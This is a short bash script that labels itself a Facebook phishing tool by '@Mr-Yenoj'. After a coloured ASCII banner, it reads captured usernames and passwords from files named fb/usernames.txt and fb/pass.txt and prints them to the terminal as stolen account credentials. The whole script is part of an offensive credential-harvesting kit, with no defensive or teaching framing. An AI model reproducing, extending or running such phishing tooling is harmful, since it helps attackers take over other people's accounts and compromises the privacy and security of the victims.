printf "\e[0m\n"
printf "\e[0m\e[92m    _      ____   __     __  \e[0m\e[93m   _____    ____  \e[0m\n"
printf "\e[0m\e[92mU  / \  u |  _ \  \ \   / /u \e[0m\e[93m  |  ___|U | __ )u\e[0m\n"
printf "\e[0m\e[92m \/ _ \/ /| | | |  \ \ / //  \e[0m\e[93m U| |_  u \|  _ \/\e[0m\n"
printf "\e[0m\e[92m / ___ \ U| |_| |\ /\ V /_,-.\e[0m\e[93m \|  _|/   | |_) |\e[0m\n"
printf "\e[0m\e[92m/_/   \_\ |____/ uU  \_/-(_/  \e[0m\e[93m |_|      |____/ \e[0m\n"
printf "\e[0m\e[92m \\    >>  |||_     //       \e[0m\e[93m    )(\\,-  _|| \\_ \e[0m\n"
printf "\e[0m\e[92m(__)  (__)(__)_)   (__)      \e[0m\e[93m (__)(_/ (__) (__)\e[0m\n"
printf "\n"
printf "\e[1;93m.:.:.\e[0m\e[1;77m Phishing Tool coded by: @Mr-Yenoj \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\e[0m\n"
id=$(grep -o '.*' fb/usernames.txt | cut -d " " -f2)
IFS=$'\n'
pass=$(grep -o '.*' fb/pass.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $id
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $pass
